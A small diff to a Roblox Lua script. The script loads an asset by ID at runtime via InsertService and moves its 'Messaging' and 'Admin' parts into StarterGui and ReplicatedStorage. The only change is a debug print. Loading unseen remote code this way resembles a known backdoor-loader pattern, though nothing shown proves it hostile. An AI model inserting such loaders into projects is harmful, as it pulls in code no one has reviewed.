@@ -1,5 +1,5 @@
 local script = game:GetService("InsertService"):LoadAsset(97703099171951)
-print(script:GetChildren())
+print(script)
 
 script:WaitForChild("Messaging").Parent = game:GetService("StarterGui")
 script:WaitForChild("Admin").Parent = game:GetService("ReplicatedStorage")
